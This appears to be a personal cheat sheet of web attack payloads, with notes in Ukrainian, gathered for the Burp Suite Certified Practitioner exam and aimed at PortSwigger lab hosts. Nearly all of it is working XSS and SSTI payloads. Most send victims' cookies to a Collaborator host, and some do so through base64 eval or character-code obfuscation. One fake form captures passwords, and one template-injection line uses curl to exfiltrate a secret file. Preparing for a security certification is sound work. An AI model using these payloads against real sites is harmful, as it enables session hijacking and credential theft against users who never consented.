# Burp-exam-notes

>Тут я викладу матеріали які можуть допомогти під час складання екзамену Burp Suite Certified Practitioner Exam. Частину із них я взяв [тут](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner), але як виявилось на практиці не всі вони були готові, деякі варто було допиляти, а деякі змінити, що забрало подекуди багато часу, з огляду на те, що сам екзамен триває 4 години. Тому дуже важливо мати усі ін'єкції робочі та перевірені, і не гаяти часу на їх виправлення під час самого екзамену.
>Корисні підказки для складання екзамену від [PortSwigger](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam)

----

**+eval**
```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//

``` 
>тут в base64 передається 
```
fetch("https://burp.oastify.com/?c="+btoa(document['cookie']))
```
**+eval URL encode**
>тут готова ін'єкція яка повертає відповідно на колаборатор кукі, просто передати script у exploit server
```
<script>
location="https://YOUR-LAB-ID.web-security-academy.net/?SearchTerm=%22%2Beval(atob(%22ZmV0Y2goImh0dHBzOi8vMmNmbTZlMmFpajVmZWQ3ZXl4ZTN3Mnc0dXYwbW9oYzYub2FzdGlmeS5jb20vP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22))}%2F%2F"
</script>
```
>-Function`X$ тут у нас ін'єкція із використанням динамічних шаблонів, вміст всередині ${...} виконується під час виконання шаблону.
```
"-Function`X${'document.location="https://burp.oastify.com/"+document.cookie'}```-"
```
>адаптована версія із використанням Function`X$, лише передати script у exploit server для отримання cookies
```
<script>
location="https://0aa7008c03742cfb80f9085a003f00c4.web-security-academy.net/?find=%22-Function`X${'document.location=%22https://pf8ftts7s6lrxx4czzvyip2f86ex2oqd.oastify.com/%22%2Bdocument.cookie'}```-%22"
</script>
```


<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>

===

"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>

===

{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}

===

\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//

===

<><img src=1 onerror="window.location='http://burp.oastify.com/c='+document.cookie">

===

<script>document.write('<img+src="http://burp.oastify.com?c='+document.cookie+'"+/>');</script>

===

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

===

<script>
location = 'https://kek.web-security-academy.net/?query=<body onload=document.location='https://burp.oastify.com/?c='+document.cookie tabindex=1>#x';
</script>

ULR Encoded:

<script>
location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocument.location%3D%27https%3A%2F%2Fburp.oastify.com%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>

===

<xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x

ULR Encoded:

%3Cxss%20id=x%20onfocus=document.location=%22http://burp.oastify.com/?c=%22+document.cookie%20tabindex=1%3E#x

=== animatetransform onbegin

<svg><animatetransform onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;>

URL Encoded:

%3Csvg%3E%3Canimatetransform%20onbegin=document.location='https://burp.oastify.com/?c='+document.cookie;%3E

===

'accesskey='x'onclick='alert(1)

===

</script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>

===

\';document.location=`http://burp.oastify.com/?c=`+document.cookie;//

===

</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt > 

Can be interpreted as

</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));</ScRiPt >

===

"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"

===

<iframe src="https://0a2c005604d146b980d6cbc5002300c8.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:fetch(\'https://your-collaborator-url.com/\'+document.cookie)','*')">
</iframe>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://your-collaborator-url.com?cookie=${document.cookie}`)>','*')">
</iframe>

=== SSTI

<%= system("curl https://your-collaborator-url.com/$(cat /home/carlos/secret)") %>

{{request.cookies.get('session')|urlize('https://your-collaborator-url.com/?cookie=')}}

=== /js/geolocate.js

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location%3d'https%3a//your-collaborator-url.oastify.com/%3fcookie%3d'%2bdocument.cookie%3b





----


